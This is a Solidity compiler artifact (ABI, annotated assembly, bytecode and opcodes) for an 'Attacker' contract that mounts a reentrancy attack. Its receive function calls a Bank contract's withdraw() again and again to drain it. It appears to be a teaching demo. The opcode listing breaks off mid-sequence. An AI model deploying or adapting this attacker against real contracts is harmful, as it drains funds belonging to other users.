{
	"Reentrancy.sol": {
		"Attacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract Bank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "chekcBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "sendEther",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawEther",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Reentrancy.sol\":585:1116  contract Attacker {... */\n  mstore(0x40, 0x80)\n    /* \"Reentrancy.sol\":784:846  constructor(address _bank) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Reentrancy.sol\":833:838  _bank */\n  dup1\n    /* \"Reentrancy.sol\":821:825  bank */\n  0x00\n  dup1\n    /* \"Reentrancy.sol\":821:839  bank = Bank(_bank) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Reentrancy.sol\":784:846  constructor(address _bank) {... */\n  pop\n    /* \"Reentrancy.sol\":585:1116  contract Attacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n    /* \"#utility.yul\":64:69   */\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":7:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:507   */\ntag_3:\n    /* \"#utility.yul\":226:232   */\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:362   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":281:360   */\n  tag_14\n  tag_15\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":243:362   */\ntag_13:\n    /* \"#utility.yul\":401:402   */\n  0x00\n    /* \"#utility.yul\":426:490   */\n  tag_16\n    /* \"#utility.yul\":482:489   */\n  dup5\n    /* \"#utility.yul\":473:479   */\n  dup3\n    /* \"#utility.yul\":462:471   */\n  dup6\n    /* \"#utility.yul\":458:480   */\n  add\n    /* \"#utility.yul\":426:490   */\n  tag_8\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":416:490   */\n  swap2\n  pop\n    /* \"#utility.yul\":372:500   */\n  pop\n    /* \"#utility.yul\":156:507   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":594:690   */\ntag_19:\n    /* \"#utility.yul\":631:638   */\n  0x00\n    /* \"#utility.yul\":660:684   */\n  tag_21\n    /* \"#utility.yul\":678:683   */\n  dup3\n    /* \"#utility.yul\":660:684   */\n  tag_22\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":649:684   */\n  swap1\n  pop\n    /* \"#utility.yul\":594:690   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:822   */\ntag_22:\n    /* \"#utility.yul\":733:740   */\n  0x00\n    /* \"#utility.yul\":773:815   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":766:771   */\n  dup3\n    /* \"#utility.yul\":762:816   */\n  and\n    /* \"#utility.yul\":751:816   */\n  swap1\n  pop\n    /* \"#utility.yul\":696:822   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":951:1068   */\ntag_15:\n    /* \"#utility.yul\":1060:1061   */\n  0x00\n    /* \"#utility.yul\":1057:1058   */\n  dup1\n    /* \"#utility.yul\":1050:1062   */\n  revert\n    /* \"#utility.yul\":1074:1196   */\ntag_11:\n    /* \"#utility.yul\":1147:1171   */\n  tag_28\n    /* \"#utility.yul\":1165:1170   */\n  dup2\n    /* \"#utility.yul\":1147:1171   */\n  tag_19\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1140:1145   */\n  dup2\n    /* \"#utility.yul\":1137:1172   */\n  eq\n    /* \"#utility.yul\":1127:1190   */\n  tag_29\n  jumpi\n    /* \"#utility.yul\":1186:1187   */\n  0x00\n    /* \"#utility.yul\":1183:1184   */\n  dup1\n    /* \"#utility.yul\":1176:1188   */\n  revert\n    /* \"#utility.yul\":1127:1190   */\ntag_29:\n    /* \"#utility.yul\":1074:1196   */\n  pop\n  jump\t// out\n    /* \"Reentrancy.sol\":585:1116  contract Attacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Reentrancy.sol\":585:1116  contract Attacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0e29df22\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x300180e9\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x7362377b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x76cdb03b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"Reentrancy.sol\":729:730  0 */\n      0x00\n        /* \"Reentrancy.sol\":709:719  msg.sender */\n      caller\n        /* \"Reentrancy.sol\":701:728  address(msg.sender).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"Reentrancy.sol\":701:730  address(msg.sender).balance>0 */\n      gt\n        /* \"Reentrancy.sol\":698:772  if(address(msg.sender).balance>0) {... */\n      iszero\n      tag_10\n      jumpi\n        /* \"Reentrancy.sol\":746:750  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Reentrancy.sol\":746:759  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"Reentrancy.sol\":746:761  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_13:\n      pop\n      pop\n      pop\n      pop\n        /* \"Reentrancy.sol\":698:772  if(address(msg.sender).balance>0) {... */\n    tag_10:\n        /* \"Reentrancy.sol\":585:1116  contract Attacker {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Reentrancy.sol\":852:938  function sendEther() external payable {... */\n    tag_3:\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      stop\n        /* \"Reentrancy.sol\":1016:1113  function chekcBalance() external view returns(uint) {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Reentrancy.sol\":944:1010  function withdrawEther() external {... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"Reentrancy.sol\":613:629  Bank public bank */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      tag_27\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Reentrancy.sol\":635:655  address public owner */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_29\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_29:\n      pop\n      tag_30\n      tag_31\n      jump\t// in\n    tag_30:\n      mload(0x40)\n      tag_32\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Reentrancy.sol\":852:938  function sendEther() external payable {... */\n    tag_15:\n        /* \"Reentrancy.sol\":900:904  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Reentrancy.sol\":900:912  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"Reentrancy.sol\":919:928  msg.value */\n      callvalue\n        /* \"Reentrancy.sol\":900:931  bank.deposit{value:msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_35:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_37:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Reentrancy.sol\":852:938  function sendEther() external payable {... */\n      jump\t// out\n        /* \"Reentrancy.sol\":1016:1113  function chekcBalance() external view returns(uint) {... */\n    tag_18:\n        /* \"Reentrancy.sol\":1062:1066  uint */\n      0x00\n        /* \"Reentrancy.sol\":1085:1106  address(this).balance */\n      selfbalance\n        /* \"Reentrancy.sol\":1078:1106  return address(this).balance */\n      swap1\n      pop\n        /* \"Reentrancy.sol\":1016:1113  function chekcBalance() external view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"Reentrancy.sol\":944:1010  function withdrawEther() external {... */\n    tag_23:\n        /* \"Reentrancy.sol\":988:992  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Reentrancy.sol\":988:1001  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"Reentrancy.sol\":988:1003  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_40\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_40:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_42\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_42:\n      pop\n      pop\n      pop\n      pop\n        /* \"Reentrancy.sol\":944:1010  function withdrawEther() external {... */\n      jump\t// out\n        /* \"Reentrancy.sol\":613:629  Bank public bank */\n    tag_26:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Reentrancy.sol\":635:655  address public owner */\n    tag_31:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_44:\n        /* \"#utility.yul\":94:118   */\n      tag_46\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":7:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:284   */\n    tag_48:\n        /* \"#utility.yul\":229:277   */\n      tag_50\n        /* \"#utility.yul\":271:276   */\n      dup2\n        /* \"#utility.yul\":229:277   */\n      tag_51\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":224:227   */\n      dup3\n        /* \"#utility.yul\":217:278   */\n      mstore\n        /* \"#utility.yul\":131:284   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":290:408   */\n    tag_52:\n        /* \"#utility.yul\":377:401   */\n      tag_54\n        /* \"#utility.yul\":395:400   */\n      dup2\n        /* \"#utility.yul\":377:401   */\n      tag_55\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":372:375   */\n      dup3\n        /* \"#utility.yul\":365:402   */\n      mstore\n        /* \"#utility.yul\":290:408   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":414:636   */\n    tag_33:\n        /* \"#utility.yul\":507:511   */\n      0x00\n        /* \"#utility.yul\":545:547   */\n      0x20\n        /* \"#utility.yul\":534:543   */\n      dup3\n        /* \"#utility.yul\":530:548   */\n      add\n        /* \"#utility.yul\":522:548   */\n      swap1\n      pop\n        /* \"#utility.yul\":558:629   */\n      tag_57\n        /* \"#utility.yul\":626:627   */\n      0x00\n        /* \"#utility.yul\":615:624   */\n      dup4\n        /* \"#utility.yul\":611:628   */\n      add\n        /* \"#utility.yul\":602:608   */\n      dup5\n        /* \"#utility.yul\":558:629   */\n      tag_44\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":414:636   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":642:886   */\n    tag_28:\n        /* \"#utility.yul\":746:750   */\n      0x00\n        /* \"#utility.yul\":784:786   */\n      0x20\n        /* \"#utility.yul\":773:782   */\n      dup3\n        /* \"#utility.yul\":769:787   */\n      add\n        /* \"#utility.yul\":761:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":797:879   */\n      tag_59\n        /* \"#utility.yul\":876:877   */\n      0x00\n        /* \"#utility.yul\":865:874   */\n      dup4\n        /* \"#utility.yul\":861:878   */\n      add\n        /* \"#utility.yul\":852:858   */\n      dup5\n        /* \"#utility.yul\":797:879   */\n      tag_48\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":642:886   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":892:1114   */\n    tag_20:\n        /* \"#utility.yul\":985:989   */\n      0x00\n        /* \"#utility.yul\":1023:1025   */\n      0x20\n        /* \"#utility.yul\":1012:1021   */\n      dup3\n        /* \"#utility.yul\":1008:1026   */\n      add\n        /* \"#utility.yul\":1000:1026   */\n      swap1\n      pop\n        /* \"#utility.yul\":1036:1107   */\n      tag_61\n        /* \"#utility.yul\":1104:1105   */\n      0x00\n        /* \"#utility.yul\":1093:1102   */\n      dup4\n        /* \"#utility.yul\":1089:1106   */\n      add\n        /* \"#utility.yul\":1080:1086   */\n      dup5\n        /* \"#utility.yul\":1036:1107   */\n      tag_52\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":892:1114   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1120:1216   */\n    tag_47:\n        /* \"#utility.yul\":1157:1164   */\n      0x00\n        /* \"#utility.yul\":1186:1210   */\n      tag_63\n        /* \"#utility.yul\":1204:1209   */\n      dup3\n        /* \"#utility.yul\":1186:1210   */\n      tag_64\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1175:1210   */\n      swap1\n      pop\n        /* \"#utility.yul\":1120:1216   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1222:1348   */\n    tag_64:\n        /* \"#utility.yul\":1259:1266   */\n      0x00\n        /* \"#utility.yul\":1299:1341   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1292:1297   */\n      dup3\n        /* \"#utility.yul\":1288:1342   */\n      and\n        /* \"#utility.yul\":1277:1342   */\n      swap1\n      pop\n        /* \"#utility.yul\":1222:1348   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1354:1431   */\n    tag_55:\n        /* \"#utility.yul\":1391:1398   */\n      0x00\n        /* \"#utility.yul\":1420:1425   */\n      dup2\n        /* \"#utility.yul\":1409:1425   */\n      swap1\n      pop\n        /* \"#utility.yul\":1354:1431   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1437:1574   */\n    tag_51:\n        /* \"#utility.yul\":1498:1507   */\n      0x00\n        /* \"#utility.yul\":1531:1568   */\n      tag_68\n        /* \"#utility.yul\":1562:1567   */\n      dup3\n        /* \"#utility.yul\":1531:1568   */\n      tag_69\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1518:1568   */\n      swap1\n      pop\n        /* \"#utility.yul\":1437:1574   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1580:1706   */\n    tag_69:\n        /* \"#utility.yul\":1630:1639   */\n      0x00\n        /* \"#utility.yul\":1663:1700   */\n      tag_71\n        /* \"#utility.yul\":1694:1699   */\n      dup3\n        /* \"#utility.yul\":1663:1700   */\n      tag_72\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":1650:1700   */\n      swap1\n      pop\n        /* \"#utility.yul\":1580:1706   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1712:1825   */\n    tag_72:\n        /* \"#utility.yul\":1762:1771   */\n      0x00\n        /* \"#utility.yul\":1795:1819   */\n      tag_74\n        /* \"#utility.yul\":1813:1818   */\n      dup3\n        /* \"#utility.yul\":1795:1819   */\n      tag_64\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":1782:1819   */\n      swap1\n      pop\n        /* \"#utility.yul\":1712:1825   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220fb3f6a5408cdd58043b8600ed71225eaafec4f3e10dda7dda96085131f68a15064736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506040516105313803806105318339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b61041a806101176000396000f3fe60806040526004361061004e5760003560e01c80630e29df22146100fb578063300180e9146101055780637362377b1461013057806376cdb03b146101475780638da5cb5b14610172576100f6565b366100f65760003373ffffffffffffffffffffffffffffffffffffffff163111156100f45760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100db57600080fd5b505af11580156100ef573d6000803e3d6000fd5b505050505b005b600080fd5b61010361019d565b005b34801561011157600080fd5b5061011a610220565b6040516101279190610357565b60405180910390f35b34801561013c57600080fd5b50610145610228565b005b34801561015357600080fd5b5061015c6102aa565b604051610169919061033c565b60405180910390f35b34801561017e57600080fd5b506101876102ce565b6040516101949190610321565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020557600080fd5b505af1158015610219573d6000803e3d6000fd5b5050505050565b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561029057600080fd5b505af11580156102a4573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6102fd81610372565b82525050565b61030c816103ae565b82525050565b61031b816103a4565b82525050565b600060208201905061033660008301846102f4565b92915050565b60006020820190506103516000830184610303565b92915050565b600060208201905061036c6000830184610312565b92915050565b600061037d82610384565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103b9826103c0565b9050919050565b60006103cb826103d2565b9050919050565b60006103dd82610384565b905091905056fea2646970667358221220fb3f6a5408cdd58043b8600ed71225eaafec4f3e10dda7dda96085131f68a15064736f6c63430008070033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x531 CODESIZE SUB DUP1 PUSH2 0x531 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xF1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA3 JUMPI PUSH2 0xA2 PUSH2 0xEC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xB1 DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC5 DUP3 PUSH2 0xCC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFA DUP2 PUSH2 0xBA JUMP JUMPDEST DUP2 EQ PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x41A DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xE29DF22 EQ PUSH2 0xFB JUMPI DUP1 PUSH4 0x300180E9 EQ PUSH2 0x105 JUMPI DUP1 PUSH4 0x7362377B EQ PUSH2 0x130 JUMPI DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x147 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x172 JUMPI PUSH2 0xF6 JUMP JUMPDEST CALLDATASIZE PUSH2 0xF6 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0xF4 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x103 PUSH2 0x19D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x111 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x11A PUSH2 0x220 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x127 SWAP2 SWAP1 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x145 PUSH2 0x228 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x15C PUSH2 0x2AA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x169 SWAP2 SWAP1 PUSH2 0x33C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x17E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x187 PUSH2 0x2CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x194 SWAP2 SWAP1 PUSH2 0x321 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x205 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x219 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 